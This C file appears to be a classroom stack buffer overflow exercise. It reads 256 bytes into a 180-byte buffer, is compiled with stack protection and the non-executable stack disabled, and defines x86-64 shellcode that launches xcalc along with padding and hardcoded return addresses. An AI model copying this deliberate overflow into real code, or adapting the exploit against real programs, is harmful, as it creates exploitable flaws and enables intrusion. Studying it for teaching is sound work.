#include <stdio.h>
#include <string.h>

/* compile with
   gcc -g -o example_3 example_3.c -fno-stack-protector -z execstack
*/


// does execv("/usr/bin/xcalc",["/usr/bin/xcalc","-display",":0"])
#define XCALC_SHELLCODE "\x48\x31\xd2\x52\x48\xb8\x69\x6e\x2f\x78\x63\x61\x6c\x63\x50\x48\xb8\x2f\x2f\x2f\x75\x73\x72\x2f\x62\x50\x48\x89\xe7\x52\x48\xb8\x2d\x64\x69\x73\x70\x6c\x61\x79\x50\x48\x89\xe6\x52\x48\xb8\x3a\x30\x30\x30\x30\x30\x30\x30\x50\x48\x89\xe0\x52\x50\x56\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"

#define PADDING "<-shellcode--------------------------------------------------padding-------------------------------------------return-address->"


#define GDB_STACK_ADDR "\x80\xdc\xff\xff\xff\x7f"

#define STACK_ADDR "\x10\xdd\xff\xff\xff\x7f"

char input[]= XCALC_SHELLCODE PADDING STACK_ADDR ; 


int say_hello()
{
  char name[180];
  // printf("address of name: %p\n",(void *)name); // use to find address of name
  printf("What's your name: ");
  fgets(name,256,stdin);
  // strcpy(name,input); // use this instead of fgets for testing
  printf("hello %s\n",name);
}

#include <stdlib.h>
int main() {
  // printf(input); // to print the exploit
  say_hello();
}

